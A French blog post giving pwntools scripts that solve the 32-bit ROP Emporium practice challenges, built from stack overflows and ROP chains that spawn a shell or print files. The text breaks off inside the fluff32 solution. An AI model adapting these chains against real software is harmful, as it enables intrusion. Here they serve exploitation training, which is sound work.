  <div class="wrapper"><a class="site-title" rel="author" href="/">kik0uO7</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/posts/">Related posts</a><a class="page-link" href="/tags/">Tags</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">ROP Emporium (32-bits)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2020-10-10T00:00:00+02:00" itemprop="datePublished">
        Oct 10, 2020
      </time>• 
          <span itemprop="author" itemscope itemtype="http://schema.org/Person">
            <span class="p-author h-card" itemprop="name">kik0uO7</span></span></p>
      
      
          <h2>Table of content</h2>
          <div id="table-of-contents">
              <ul class="section-nav">
<li class="toc-entry toc-h1"><a href="#ret2win32">ret2win32</a></li>
<li class="toc-entry toc-h1"><a href="#split32">split32</a></li>
<li class="toc-entry toc-h1"><a href="#callme32">callme32</a></li>
<li class="toc-entry toc-h1"><a href="#write432">write432</a></li>
<li class="toc-entry toc-h1"><a href="#badchars32">badchars32</a></li>
<li class="toc-entry toc-h1"><a href="#fluff32">fluff32</a></li>
<li class="toc-entry toc-h1"><a href="#pivot32">pivot32</a></li>
</ul>
          </div>
      
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>Vous retrouverez mes scripts permettant de résoudre chacune des ROP présente dans la catégorie 32bits de ROP Emporium.</p>

<p>Les <em>scripts</em> présent ici ont été <em>testés</em> sur la version <strong>Juillet 2020</strong> des challenges</p>

<h1 id="ret2win32">ret2win32</h1>

<blockquote>
  <p><em>Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack.</em></p>
</blockquote>

<p>Le binaire est disponible sur le site officiel, <a href="https://ropemporium.com/challenge/ret2win.html">ici</a></p>

<h2 id="solution-">solution :</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"i386"</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'ret2win32'</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>

<span class="n">padding</span> <span class="o">=</span> <span class="s">b'A'</span> <span class="o">*</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="s">"laaa"</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">ret2win</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">b'&gt; '</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Sending payload...'</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
</code></pre></div></div>

<p><br /></p>

<h1 id="split32">split32</h1>

<blockquote>
  <p><em>In this challenge the elements that allowed you to complete the ret2win challenge are still present, they’ve just been split apart. Find them and recombine them using a short ROP chain.</em></p>
</blockquote>

<p>Le binaire est disponible sur le site officiel, <a href="https://ropemporium.com/challenge/split.html">ici</a></p>

<h2 id="solution--1">solution :</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"i386"</span>
<span class="n">context</span><span class="p">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>


<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./split32'</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>

<span class="n">padding</span> <span class="o">=</span> <span class="s">b'A'</span> <span class="o">*</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="s">"laaa"</span><span class="p">)</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">rop</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="s">'system'</span><span class="p">,</span> <span class="p">[</span><span class="s">"/bin/sh"</span><span class="p">])</span>

<span class="n">chain</span> <span class="o">=</span> <span class="n">rop</span><span class="p">.</span><span class="n">chain</span><span class="p">()</span>

<span class="n">system</span>  <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">)</span>
<span class="n">printFlag</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804a030</span><span class="p">)</span>


<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="s">b'AAAA'</span> <span class="o">+</span> <span class="n">printFlag</span>

<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">b'&gt; '</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
</code></pre></div></div>

<p><br /></p>

<h1 id="callme32">callme32</h1>

<blockquote>
  <p><em>Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table.</em></p>
</blockquote>

<p>Le binaire est disponible sur le site officiel, <a href="https://ropemporium.com/challenge/callme.html">ici</a></p>

<h2 id="solution--2">solution :</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./callme32'</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>

<span class="n">padding</span> <span class="o">=</span> <span class="s">b'A'</span> <span class="o">*</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="s">"laaa"</span><span class="p">)</span>

<span class="n">call1</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">callme_one</span><span class="p">)</span>
<span class="n">call2</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">callme_two</span><span class="p">)</span>
<span class="n">call3</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">callme_three</span><span class="p">)</span>

<span class="n">gadget</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080487f9</span><span class="p">)</span>

<span class="n">param1</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="n">param2</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>
<span class="n">param3</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xd00df00d</span><span class="p">)</span>


<span class="c1"># gdb.attach(io.proc.pid, 'b*0xf7fc864f')
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> 
<span class="n">payload</span> <span class="o">+=</span> <span class="n">call1</span> <span class="o">+</span> <span class="n">gadget</span> <span class="o">+</span> <span class="n">param1</span> <span class="o">+</span> <span class="n">param2</span> <span class="o">+</span> <span class="n">param3</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">call2</span> <span class="o">+</span> <span class="n">gadget</span> <span class="o">+</span> <span class="n">param1</span> <span class="o">+</span> <span class="n">param2</span> <span class="o">+</span> <span class="n">param3</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">call3</span> <span class="o">+</span> <span class="n">gadget</span> <span class="o">+</span> <span class="n">param1</span> <span class="o">+</span> <span class="n">param2</span> <span class="o">+</span> <span class="n">param3</span>

<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
</code></pre></div></div>

<p><br /></p>

<h1 id="write432">write432</h1>

<blockquote>
  <p><em>Our first foray into proper gadget use. A useful function is still present but we’ll need to write a string into memory somehow.</em></p>
</blockquote>

<p>Le binaire est disponible sur le site officiel, <a href="https://ropemporium.com/challenge/write4.html">ici</a></p>

<h2 id="solution--3">solution :</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">libWrite</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libwrite432.so'</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./write432'</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>


<span class="c1"># On va écrire flag.txt en mémoire. 
# Puis l'appelé avec print_flag qui est dans la librairie partagé linwrite432.so
</span>
<span class="c1"># C'est un endroit ou on peut écrire.
</span><span class="n">write_addr</span> <span class="o">=</span> <span class="mh">0x804a0a0</span>

<span class="k">def</span> <span class="nf">rop_chain_write</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
    <span class="c1"># Permet de mettre les valeurs qu'on veut dans ebp, est dans esp.
</span>    <span class="c1"># pop edi; pop ebp; ret;
</span>    <span class="n">gadget_pop</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080485aa</span><span class="p">)</span>

    <span class="c1"># Permet d'écrire une valeur à une adresse voulue.
</span>    <span class="c1"># mov dword ptr [edi], ebp; ret; 
</span>    <span class="n">gadget_mov</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048543</span><span class="p">)</span>

    <span class="n">rop</span> <span class="o">=</span> <span class="s">b''</span>
    <span class="n">size_str</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">size_str</span><span class="o">%</span><span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">string</span> <span class="o">=</span> <span class="p">(</span><span class="n">string</span><span class="o">+</span><span class="s">b'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="p">(</span><span class="n">size_str</span> <span class="o">//</span> <span class="mi">4</span><span class="p">))[:((</span><span class="n">size_str</span> <span class="o">//</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="o">//</span> <span class="mh">0x4</span><span class="p">):</span>
        <span class="n">rop</span> <span class="o">+=</span> <span class="n">gadget_pop</span>
        <span class="n">rop</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_addr</span> <span class="o">+</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span><span class="mh">0x4</span><span class="p">))</span> 
        <span class="n">rop</span> <span class="o">+=</span> <span class="n">string</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mh">0x4</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x4</span><span class="p">]</span>
        <span class="n">rop</span> <span class="o">+=</span> <span class="n">gadget_mov</span>

    <span class="k">return</span> <span class="n">rop</span>    


<span class="n">print_f</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">print_file</span><span class="p">)</span> <span class="o">+</span> <span class="s">b'RET!'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">b'&gt; '</span><span class="p">)</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">b'A'</span> <span class="o">*</span> <span class="mi">44</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">rop_chain_write</span><span class="p">(</span><span class="s">b'flag.txt'</span><span class="p">)</span> <span class="o">+</span> <span class="n">print_f</span>

<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
</code></pre></div></div>

<p><br /></p>

<h1 id="badchars32">badchars32</h1>

<blockquote>
  <p><em>An arbitrary write challenge with a twist; certain input characters get mangled as they make their way onto the stack. Find a way to deal with this and craft your exploit.</em></p>
</blockquote>

<p>Le binaire est disponible sur le site officiel, <a href="https://ropemporium.com/challenge/write4.html">ici</a></p>

<h2 id="solution--4">solution :</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./badchars32'</span><span class="p">)</span>

<span class="c1"># Adresse ou on va écrire.
</span><span class="n">write_addr</span> <span class="o">=</span> <span class="mh">0x804a130</span>

<span class="c1"># 0x08048547: xor byte ptr [ebp], bl; ret; 
</span><span class="n">gadget_xor</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048547</span><span class="p">)</span> 

<span class="c1"># 0x0804854f: mov dword ptr [edi], esi; ret; 
</span><span class="n">gadget_mov</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804854f</span><span class="p">)</span>

<span class="c1"># 0x080485b8: pop ebx; pop esi; pop edi; pop ebp; ret; 
</span><span class="n">gadget_pop</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080485b8</span><span class="p">)</span> 

<span class="c1">### Les mauvais caractères.
</span><span class="n">badchars</span> <span class="o">=</span> <span class="s">b'agx.'</span>

<span class="k">def</span> <span class="nf">pop_chain</span><span class="p">(</span><span class="n">ebx</span><span class="p">,</span> <span class="n">esi</span><span class="p">,</span> <span class="n">edi</span><span class="p">,</span> <span class="n">ebp</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">gadget_pop</span> <span class="o">+</span> <span class="n">ebx</span> <span class="o">+</span> <span class="n">esi</span> <span class="o">+</span> <span class="n">edi</span> <span class="o">+</span> <span class="n">ebp</span>


<span class="k">def</span> <span class="nf">chain_badchars</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
    <span class="n">bad_rop</span> <span class="o">=</span> <span class="s">b''</span>
    <span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xff</span>
    <span class="c1">## On va parcourir la chaine octet par octet, afin de de xored uniquement le dernier octet de chaque,
</span>    <span class="c1">## car le on xor que le premier caractère de chaque dword.
</span>    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">badchars</span><span class="p">:</span>
            <span class="n">xored</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">u32</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">val</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="s">b'</span><span class="se">\x00\x00\x00</span><span class="s">'</span><span class="p">)</span> <span class="o">^</span> <span class="n">xor_key</span><span class="p">)</span>

            <span class="c1">### ebx, esi, edi, ebp -&gt; edi == ebp car pointe sur la même adresse.
</span>            <span class="n">bad_rop</span> <span class="o">+=</span> <span class="n">pop_chain</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">xor_key</span><span class="p">),</span> <span class="n">xored</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_addr</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">i</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_addr</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">i</span><span class="p">))</span> 
            <span class="n">bad_rop</span> <span class="o">+=</span> <span class="n">gadget_mov</span> <span class="o">+</span> <span class="n">gadget_xor</span>

        <span class="k">else</span><span class="p">:</span>
            <span class="n">bad_rop</span> <span class="o">+=</span> <span class="n">pop_chain</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span> <span class="nb">chr</span><span class="p">(</span><span class="n">val</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="s">b'</span><span class="se">\x00\x00\x00</span><span class="s">'</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_addr</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">i</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0</span><span class="p">))</span>
            <span class="n">bad_rop</span> <span class="o">+=</span> <span class="n">gadget_mov</span>
            

    <span class="k">return</span> <span class="n">bad_rop</span>

    
<span class="k">def</span> <span class="nf">chain_goodchars</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">offset</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">pop_chain</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span> <span class="n">b</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_addr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">),</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0</span><span class="p">))</span> <span class="o">+</span> <span class="n">gadget_mov</span>


<span class="k">def</span> <span class="nf">ropchain_badchars</span><span class="p">(</span><span class="n">strbytes</span><span class="p">):</span>
    <span class="n">size_str</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">strbytes</span><span class="p">)</span>
    <span class="n">rop_chain</span> <span class="o">=</span> <span class="s">b''</span>

    <span class="c1">## Rajoute des \x00 si la chaine n'est pas un multiple de 4.
</span>    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">size_str</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">strbytes</span> <span class="o">=</span> <span class="p">(</span><span class="n">strbytes</span><span class="o">+</span><span class="s">b'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="p">(</span><span class="n">size_str</span><span class="o">//</span><span class="mi">4</span><span class="p">))[</span> <span class="p">:</span> <span class="p">((</span><span class="n">size_str</span><span class="o">//</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span><span class="p">]</span>
  
    <span class="c1">## Coupe la chaine de bytes en blocs de 4.
</span>    <span class="n">array_dword</span> <span class="o">=</span> <span class="p">[</span><span class="n">strbytes</span><span class="p">[</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="p">:</span> <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">strbytes</span><span class="p">)</span> <span class="o">//</span> <span class="mi">4</span><span class="p">)]</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">array_dword</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>
        <span class="k">if</span> <span class="s">b'a'</span> <span class="ow">in</span> <span class="n">val</span> <span class="ow">or</span> <span class="s">b'g'</span> <span class="ow">in</span> <span class="n">val</span> <span class="ow">or</span> <span class="s">b'x'</span> <span class="ow">in</span> <span class="n">val</span> <span class="ow">or</span> <span class="s">b'.'</span> <span class="ow">in</span> <span class="n">val</span><span class="p">:</span>
            <span class="n">rop_chain</span> <span class="o">+=</span> <span class="n">chain_badchars</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">rop_chain</span> <span class="o">+=</span> <span class="n">chain_goodchars</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="p">(</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span><span class="p">))</span>

    <span class="k">return</span> <span class="n">rop_chain</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">padding</span> <span class="o">=</span> <span class="s">b'A'</span> <span class="o">*</span> <span class="mi">44</span>
    <span class="n">rop</span> <span class="o">=</span> <span class="n">ropchain_badchars</span><span class="p">(</span><span class="s">b'/etc/'</span><span class="p">)</span>

    <span class="n">print_file</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080483d0</span><span class="p">)</span> <span class="o">+</span> <span class="s">b'RET!'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">rop</span> <span class="o">+</span> <span class="n">print_file</span>

    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">)</span>

    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
</code></pre></div></div>

<p><br /></p>

<h1 id="fluff32">fluff32</h1>

<blockquote>
  <p><em>The concept here is identical to the write4 challenge. The only difference is we may struggle to find gadgets that will get the job done. However if we take our time to consider all our options, we’ll succeed.</em></p>
</blockquote>

<p>Le binaire est disponible sur le site officiel, <a href="https://ropemporium.com/challenge/fluff.html">ici</a></p>

<h2 id="solution--5">solution :</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./fluff32'</span><span class="p">)</span>

<span class="n">addr_write</span> <span class="o">=</span> <span class="mh">0x804ae90</span>

<span class="k">def</span> <span class="nf">align32</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="p">(</span><span class="s">'0'</span><span class="o">*</span><span class="mi">32</span><span class="o">+</span><span class="n">s</span><span class="p">)[</span><span class="o">-</span><span class="mi">32</span><span class="p">:]</span>

<span class="k">def</span> <span class="nf">pext</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">mask</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">src_bin</span> <span class="o">=</span> <span class="n">align32</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="n">src</span><span class="p">)[</span><span class="mi">2</span><span class="p">:])</span>
    <span class="n">mask_bin</span> <span class="o">=</span> <span class="n">align32</span><span class="p">(</span><span class="nb">bin</span><span class="p">(</span><span class="n">mask</span><span class="p">)[</span><span class="mi">2</span><span class="p">:])</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">mask_bin</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">mask_bin</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s">'1'</span><span class="p">:</span>
            <span class="n">res</span> <span class="o">=</span> <span class="n">src_bin</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">res</span> 

    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">res</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_bytes_by_char</span><span class="p">(</span><span class="n">char</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xff</span><span class="p">):</span>
        <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="n">pext</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">==</span> <span class="n">char</span><span class="p">:</span>
            <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'latin1'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">rop_write</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">rop</span> <span class="o">=</span> <span class="n">gadget_pext</span>
    <span class="k">for</span> <span class="n">offset</span><span class="p">,</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
        <span class="n">pext_value</span> <span class="o">=</span> <span class="n">get_bytes_by_char</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">char</span><span class="p">))</span>
        
        <span class="n">rop</span> <span class="o">+=</span> <span class="n">gadget_pop</span> <span class="o">+</span> <span class="n">pext_value</span> <span class="o">+</span> <span class="s">b'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">gadget_pext</span>
        <span class="n">rop</span> <span class="o">+=</span> <span class="n">gadget_set_ecx</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">addr_write</span> <span class="o">+</span> <span class="n">offset</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">'big'</span><span class="p">)</span>
        <span class="n">rop</span> <span class="o">+=</span> <span class="n">gadget_xchg</span>

    <span class="k">return</span> <span class="n">rop</span>


<span class="c1">#####################
###### GADGETS ######
#####################
</span>
<span class="c1"># 0x08048558: pop ecx; bswap ecx; ret; 
</span><span class="n">gadget_set_ecx</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048558</span><span class="p">)</span>

<span class="c1"># 0x08048555: xchg byte ptr [ecx], dl; ret; 
</span><span class="n">gadget_xchg</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048555</span><span class="p">)</span>

<span class="c1"># 0x080485d6: pop ebx; ret; 
</span><span class="n">gadget_pop</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080485d6</span><span class="p">)</span>

<span class="c1"># 0x0804854a: pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
